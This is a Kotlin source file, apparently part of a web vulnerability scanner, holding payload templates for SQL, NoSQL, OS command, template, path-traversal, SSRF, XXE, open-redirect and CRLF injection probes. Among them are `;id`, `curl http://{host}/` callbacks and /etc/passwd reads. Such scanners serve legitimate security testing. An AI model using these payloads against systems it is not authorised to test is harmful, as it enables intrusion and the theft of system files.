package io.bitbytelab.raijin.injection

/**
 * The payloads `injection_probe` sends, as templates. `{base}` is the benign value the baseline
 * request carries, so an appended payload leaves the original query intact; the other
 * placeholders are filled per probe. Payloads are written with their real characters (a newline,
 * not `%0a`): [FuzzTemplate] encodes them for where the `FUZZ` marker sits.
 */
object InjectionPayloads {

    /**
     * A payload and the query text it assumes on either side of the injected value ([before],
     * [after]): a pair of quotes, a parenthesis. `before + text + after` must be balanced.
     */
    data class Enclosed(val text: String, val before: String = "", val after: String = "")

    /** Literals of one boolean round: [lo] sorts before [hi] both as a number and as a string. */
    data class Literals(val lo: String, val hi: String)

    /**
     * Boolean conditions compare two literals with `<`; the FALSE payload is the TRUE one with
     * the literals swapped. Both sides of a pair are thus the same characters, so an echoed
     * payload, a search engine tokenising it or a filter keyed on its shape treats them alike,
     * and each round uses fresh literals so nothing tied to one literal can repeat.
     */
    val booleanRounds: List<Literals> = listOf(
        Literals("49173", "58231"),
        Literals("29485", "73619"),
        Literals("61392", "82547"),
    )

    /** [template] with `{x}<{y}` true or false for [round], appended to [base]. */
    fun boolean(template: String, base: String, round: Int, truth: Boolean): String {
        val literals = booleanRounds[round % booleanRounds.size]
        val x = if (truth) literals.lo else literals.hi
        val y = if (truth) literals.hi else literals.lo
        return template.replace("{x}", x).replace("{y}", y).replace("{base}", base)
    }

    /** [template] asking for a delay of [seconds] (`0` gives the no-delay control). */
    fun timed(template: String, base: String, seconds: Int): String = template
        .replace("{delay_ms}", (seconds * 1000).toString())
        .replace("{delay}", seconds.toString())
        .replace("{pings}", (seconds + 1).toString())
        .replace("{base}", base)

    /** [template] with its `A*B` placeholder set to the product to compute. */
    fun arithmetic(template: String, base: String, a: Int, b: Int): String =
        template.replace("A*B", "$a*$b").replace("{base}", base)

    // ---------------------------------------------------------------
    // SQL
    // ---------------------------------------------------------------

    /** Appended to the base value to unbalance the query and raise a database error. */
    val sqlBreakers: List<String> = listOf("'", "\"", "')", "'\"", "\\")

    val sqlBoolean: List<Enclosed> = listOf(
        Enclosed("{base}' AND '{x}'<'{y}", "'", "'"),
        Enclosed("{base} AND {x}<{y}"),
        Enclosed("{base}\" AND \"{x}\"<\"{y}", "\"", "\""),
        Enclosed("{base}') AND ('{x}'<'{y}", "('", "')"),
        Enclosed("{base}) AND ({x}<{y}", "(", ")"),
        // The value concatenated between two string literals: keep it unchanged when TRUE.
        Enclosed("{base}'||(CASE WHEN {x}<{y} THEN '' ELSE 'zq' END)||'", "'", "'"),
        Enclosed("{base}'+(CASE WHEN {x}<{y} THEN '' ELSE 'zq' END)+'", "'", "'"),
        // Last: OR widens the WHERE clause, which matters when the base value matches nothing.
        Enclosed("{base}' OR '{x}'<'{y}", "'", "'"),
    )

    /**
     * Sleep payloads per DBMS for a quoted value, an unquoted number (no quote or parenthesis to
     * close) and a value concatenated between string literals. The derived-table form sleeps
     * once whatever the row count, and also when the base value matches no row.
     */
    val sqlTime: List<Enclosed> = listOf(
        Enclosed("{base}' AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)-- -", "'", "'"),
        Enclosed("{base} AND (SELECT 1 FROM (SELECT(SLEEP({delay})))a)"),
        Enclosed("{base} AND SLEEP({delay})"),
        Enclosed("{base}' AND SLEEP({delay}) AND '1'='1", "'", "'"),
        Enclosed("{base}) AND SLEEP({delay})-- -", "(", ")"),
        Enclosed("{base}';WAITFOR DELAY '0:0:{delay}'-- -", "'", "'"),
        Enclosed("{base};WAITFOR DELAY '0:0:{delay}'-- -"),
        Enclosed("{base}'||pg_sleep({delay})||'", "'", "'"),
        Enclosed("{base}'||pg_sleep({delay})-- -", "'", "'"),
        Enclosed("{base}' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -", "'", "'"),
        Enclosed("{base} AND 1=(SELECT 1 FROM pg_sleep({delay}))"),
        Enclosed("{base}';SELECT pg_sleep({delay})-- -", "'", "'"),
        Enclosed("{base}'||DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})||'", "'", "'"),
    )

    // ---------------------------------------------------------------
    // NoSQL (MongoDB-style)
    // ---------------------------------------------------------------

    val nosqlBreakers: List<String> = listOf("'", "\"", "\\", "'\"`{ ;\$Foo}")

    /** Server-side JavaScript conditions (`$where`). */
    val nosqlBoolean: List<Enclosed> = listOf(
        Enclosed("{base}' && '{x}'<'{y}", "'", "'"),
        Enclosed("{base}\" && \"{x}\"<\"{y}", "\"", "\""),
        Enclosed("{base} && {x}<{y}"),
    )

    val nosqlTime: List<Enclosed> = listOf(
        Enclosed("{base}';sleep({delay_ms});'", "'", "'"),
        Enclosed("{base}\";sleep({delay_ms});\"", "\"", "\""),
        Enclosed("{base};sleep({delay_ms})"),
        Enclosed("{base}' && sleep({delay_ms}) && '1", "'", "'"),
    )

    /**
     * Query operators that replace the value itself (`user[$gt]=`, `{"user":{"$gt":""}}`).
     * [bounds] gives each round's operator/operand pairs for a TRUE or FALSE condition; FALSE is
     * the same operators with the operands swapped. [numeric] operands are JSON numbers.
     */
    class OperatorProbe(val label: String, val numeric: Boolean, val bounds: (round: Int, truth: Boolean) -> List<Pair<String, String>>)

    private fun range(low: String, high: String, truth: Boolean): List<Pair<String, String>> =
        if (truth) listOf("\$gt" to low, "\$lt" to high) else listOf("\$gt" to high, "\$lt" to low)

    val nosqlOperators: List<OperatorProbe> = listOf(
        OperatorProbe("string range", numeric = false) { round, truth -> range("", "~".repeat(4 + round), truth) },
        OperatorProbe("regex", numeric = false) { round, truth ->
            val inner = listOf(".*", ".{0,}", "(.*)")[round % 3]
            listOf("\$regex" to if (truth) "^$inner$" else "$${inner}^")
        },
        OperatorProbe("numeric range", numeric = true) { round, truth ->
            val bound = listOf("99999999999", "88888888888", "77777777777")[round % 3]
            range("-$bound", bound, truth)
        },
    )

    // ---------------------------------------------------------------
    // OS command injection
    // ---------------------------------------------------------------

    /** Run `id`; its output format is the oracle. */
    val cmdOutput: List<String> = listOf(
        "{base};id", "{base}|id", "{base}||id", "{base}&&id", "{base}&id", "{base}\nid",
        "{base}`id`", "{base}$(id)", "{base}';id;'", "{base}\";id;\"",
    )

    /** Have the shell do arithmetic (`A*B`), for output that does not resemble `id` (Windows included). */
    val cmdArithmetic: List<String> = listOf(
        "{base};echo $((A*B))", "{base}|echo $((A*B))", "{base}&&echo $((A*B))",
        "{base}&set /a A*B", "{base}|set /a A*B",
    )

    val cmdTime: List<Enclosed> = listOf(
        Enclosed("{base};sleep {delay}"),
        Enclosed("{base}|sleep {delay}"),
        Enclosed("{base}&&sleep {delay}"),
        Enclosed("{base}||sleep {delay}"),
        Enclosed("{base}\nsleep {delay}"),
        Enclosed("{base}`sleep {delay}`"),
        Enclosed("{base}$(sleep {delay})"),
        Enclosed("{base}';sleep {delay};'", "'", "'"),
        Enclosed("{base}\";sleep {delay};\"", "\"", "\""),
        Enclosed("{base}&ping -n {pings} 127.0.0.1"),
        Enclosed("{base}|ping -n {pings} 127.0.0.1"),
    )

    /**
     * Blind variants: resolve an out-of-band `{host}`, or fetch it, which also tells a command
     * apart from an application that merely resolves a host name it is given.
     */
    val cmdOob: List<String> = listOf(
        "{base};nslookup {host}", "{base}|nslookup {host}", "{base}&nslookup {host}",
        "{base}\nnslookup {host}", "{base}`nslookup {host}`", "{base}$(nslookup {host})",
        "{base};curl http://{host}/", "{base}|curl http://{host}/",
    )

    // ---------------------------------------------------------------
    // Template injection, file read, SSRF, XXE
    // ---------------------------------------------------------------

    /** Expression delimiters of the common template engines around the `A*B` placeholder. */
    val sstiArithmetic: List<String> = listOf(
        "{{A*B}}", "\${A*B}", "<%= A*B %>", "#{A*B}", "*{A*B}", "@(A*B)", "{A*B}", "\${{A*B}}", "[[\${A*B}]]", "{{=A*B}}",
    )

    val fileRead: List<String> = listOf(
        "../../../../../../etc/passwd",
        "/etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../../../etc/passwd%00",
        "file:///etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
    )

    /** URLs whose response is recognisable when the server fetches them and returns the result. */
    val ssrfInBand: List<String> = listOf(
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://127.0.0.1:22/",
        "http://localhost:22/",
    )

    val ssrfOob: List<String> = listOf("http://{host}/", "https://{host}/", "//{host}/", "{host}")

    val xxeFiles: List<String> = listOf("file:///etc/passwd", "file:///c:/windows/win.ini")

    // ---------------------------------------------------------------
    // Open redirect, response header injection
    // ---------------------------------------------------------------

    /** `{canary}` is a host nothing legitimate redirects to; `{target}` is the tested host, for allow-list bypasses. */
    val openRedirect: List<String> = listOf(
        "https://{canary}/",
        "//{canary}/",
        "/\\{canary}/",
        "https://{target}@{canary}/",
        "https://{target}.{canary}/",
        "https://{canary}/{target}/",
        "/%09/{canary}/",
    )

    /**
     * Ways to end the header line the value is copied into and start a `{header}` line: a raw
     * line break, its percent-encoded and double-encoded forms, and the UTF-8 characters whose
     * low bytes are LF and CR.
     */
    val crlf: List<String> = listOf(
        "{base}\r\n{header}: 1",
        "{base}\n{header}: 1",
        "{base}%0D%0A{header}: 1",
        "{base}%0A{header}: 1",
        "{base}%E5%98%8A%E5%98%8D{header}: 1",
        "{base}%250D%250A{header}: 1",
    )
}
